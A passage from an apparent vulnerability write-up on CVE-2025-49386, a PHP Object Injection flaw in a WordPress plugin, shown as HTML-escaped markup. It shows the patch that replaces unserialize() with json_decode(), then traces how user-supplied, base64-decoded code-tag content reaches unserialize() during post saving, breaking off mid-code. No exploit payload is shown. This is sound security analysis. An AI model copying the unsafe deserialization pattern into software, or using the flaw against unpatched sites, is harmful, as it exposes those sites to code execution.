(v5.0):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/diff.png&#34; title=&#34;Patch changes&#34; data-thumbnail=&#34;/posts/2025-11-20-cve-2025-49386/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Patch changes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-20-cve-2025-49386/diff.png&#39; alt=&#34;Diff&#34; height=&#34;798&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch changes&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;unserialize()&lt;/code&gt; was replaced with &lt;code&gt;json_decode()&lt;/code&gt;:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$decoded_data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;chunk_split_token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;stripslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;base64_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$matches&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;is_content_safe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$decoded_data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$matches&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;json_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$decoded_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;true&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;===&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;json_last_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!==&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;JSON_ERROR_NONE&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$decoded_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Removing &lt;code&gt;unserialize()&lt;/code&gt; completely eliminates the possibility of &lt;strong&gt;PHP Object Injection&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers the following filter:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;add_filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;content_save_pre&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;preserve_postprocess&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;100&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;content_save_pre&lt;/code&gt; hook is executed before a post’s content is written to the database. This makes it an ideal point to modify or filter content.&lt;/p&gt;&#xA;&lt;p&gt;When triggered, the callback &lt;code&gt;preserve_postprocess&lt;/code&gt; is executed:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;preserve_postprocess&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$preserve&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;false&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get_options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$preserve_tags&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;preserve_tags&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$wrap_multiline_code_in_pre&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;bool&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$options&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wrap_multiline_code_in_pre&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$preserve_tags&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$tag&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$content&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$result&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$codes&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;preg_split&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/(&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$tag&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[^&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;]]*&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;}.*&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$tag&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;})/Us&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$content&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;PREG_SPLIT_DELIM_CAPTURE&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$codes&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;as&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;preg_match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;{(&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$tag&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[^&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;]]*)&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;}(.*)&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$tag&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;}/Us&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$code&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$match&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Note:&amp;ensp;base64_decode&amp;ensp;is&amp;ensp;only&amp;ensp;being&amp;ensp;used&amp;ensp;to&amp;ensp;decode&amp;ensp;user-supplied&amp;ensp;content&amp;ensp;of&amp;ensp;code&amp;ensp;tags&amp;ensp;which&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;had&amp;ensp;been&amp;ensp;encoded&amp;ensp;earlier&amp;ensp;in&amp;ensp;the&amp;ensp;filtering&amp;ensp;process&amp;ensp;to&amp;ensp;prevent&amp;ensp;modification&amp;ensp;by&amp;ensp;WP.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$data&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;str_replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;chunk_split_token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;stripslashes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;base64_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$match&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span 